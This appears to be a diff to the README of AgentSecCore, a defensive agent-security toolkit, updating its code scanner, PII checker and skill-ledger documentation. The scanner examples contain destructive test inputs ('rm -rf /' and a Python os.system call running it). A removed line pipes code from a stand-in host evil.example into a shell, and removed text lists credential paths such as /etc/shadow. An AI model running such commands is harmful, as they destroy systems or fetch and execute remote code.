@@ -9,6 +9,12 @@ security event store. Everything runs locally with no Token cost. Applicable to
 Agent OS platforms such as [ANOLISA](../../README.md) and to the six Agent hosts
 listed below.
 
+[![AARM Aligned](https://img.shields.io/badge/AARM-Aligned-blue.svg)](https://aarm.dev/builders/agentseccore-anolisa)
+
+**AgentSecCore (ANOLISA)** is listed in the [AARM Builder Registry](https://aarm.dev/builders/agentseccore-anolisa) with **Aligned** status.
+
+AgentSecCore contributes controls to the [ANOLISA OWASP Agentic Top 10 mapping](../../docs/user-guide/en/agent-security/owasp-agentic-top10.md).
+
 ## Background
 
 As AI Agents gradually gain OS-level execution capabilities (file I/O, network access, process management, etc.), traditional application security boundaries no longer apply. Agent Sec Core builds a **defense-in-depth** system at the OS layer, ensuring Agents run in a controlled, auditable, least-privilege environment.
@@ -102,7 +108,7 @@ agent-sec-core/
 ├── qwen-code-extension/       # Qwen Code hooks
 ├── qoder-plugin/              # Qoder CLI hooks
 ├── codex-plugin/              # Codex hooks
-├── skills/                    # Security skills: code-scanner, prompt-scanner, skill-ledger
+├── skills/                    # Bundled security scanning and audit skills
 ├── tools/                     # sign-skill.sh — PGP skill signing utility
 ├── packaging/                 # raw package build + systemd unit template
 ├── scripts/                   # CLI/daemon wrappers and CI helpers
@@ -310,31 +316,37 @@ Details: [Prompt Scanner User Guide](../../docs/user-guide/en/agent-security/age
 
 ## Code Scanner
 
-Scans bash and python source for dangerous operations. The verdict enum is
-`pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or
-`pass`.
+Scans bash and python source for dangerous operations. In the V2 RPM,
+`scan-code` is a Rust daemon client: it requires an already-running
+`agent-sec-daemon` and uses `AGENT_SEC_DAEMON_SOCKET` unless an explicit
+`--socket` overrides it. The CLI never starts a daemon or falls back to Python.
 
 ```bash
-# regex engine (default)
-agent-sec-cli scan-code --code 'rm -rf /'
-agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+# The deployment supplies the daemon endpoint.
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
 
-# LLM engine (requires a configured model backend)
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
+# Regex engine (the only V2 scanning engine currently available)
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
 ```
 
-Rules live under `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`.
-Both language rule sets share core system credential and configuration paths such
-as `/etc/shadow`, `/etc/sudoers`, `/etc/pam.d/`, `/etc/sysctl.d/`, `/boot/`, and
-`/usr/lib/systemd/`. Bash adds shell-history and cluster-credential patterns such
-as `/etc/kubernetes/` and `kubeconfig`; Python has a narrower path list. These
-paths drive scanner findings; they are not kernel-enforced write protection.
+The verdict enum is `pass` / `warn` / `deny` / `error`; built-in rules currently
+produce `warn` or `pass`. Rules are embedded in the V2 binary rather than read
+from a Python source-tree directory. `--mode llm` remains accepted for CLI
+compatibility but returns `LLM model not available`; `--trace-context` and
+code-scan telemetry are not yet available in V2, so hooks requiring them remain
+deferred.
 
-Host hook modes: [Code Scanner Hook Configuration](../../docs/user-guide/en/agent-security/agent-sec-core/code-scanner.md).
+Full daemon endpoint, CLI, and host-hook status:
+[Code Scanner User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/code-scanner.md).
 
 ## PII Checker
 
 Detects personal data and credentials, and can emit redacted text.
+
+The bundled [pii-checker Skill](skills/pii-checker/SKILL.md) lets an Agent scan
+specified text or files and generate redacted text with the V1 CLI.
 
 ```bash
 agent-sec-cli scan-pii --text "contact alice@example.com" --source manual
@@ -359,7 +371,10 @@ The six integrity states are `pass` / `none` / `drifted` / `warn` / `deny` /
 `analyze` for read-only content findings. In batch mode, a host-backed packaged
 Skill under `/usr/share/anolisa/skills/` or `/usr/local/share/anolisa/skills/`
 whose ledger state is read-only is reported as `status=skipped`,
-`reasonCode=readonly_system_skill`, `persisted=false`. This operational skip is
+`reasonCode=readonly_system_skill`, `persisted=false`. Read-only host Skills directly
+under `$XDG_DATA_HOME/anolisa/skills/` (default `~/.local/share/anolisa/skills/`)
+are also skipped with `reasonCode=readonly_default_skill` unless covered by
+`managedSkillDirs`; managed user Skills retain write errors. This operational skip is
 not a `pass` result or an attestation. An explicit `scan <dir>` remains an error.
 When a skipped Skill has no prior ledger artifacts, `check` and `status`
 continue to report `none` / `unscanned`; neither value means `pass`.
@@ -381,11 +396,8 @@ continue to report `none` / `unscanned`; neither value means `pass`.
 | `audit <dir>` | Show version history and signature chain |
 | `check --all` / `scan --all` | Batch mode across all registered skill dirs |
 
-`decide` is the supported interface for recording user decisions. The former
-hidden `set-policy` placeholder was never implemented and is not a supported
-command; invoking it is an unknown-command usage error with exit code 2. The
-hidden `rotate-keys` reservation also remains unavailable: direct execution
-exits non-zero and leaves the signing keys unchanged.
+`init --no-baseline` initializes keys without scanning Skills. `rotate-keys` is
+visible in help and reports that it is not implemented (exit 1, no key changes).
 
 ### Quick Example
 
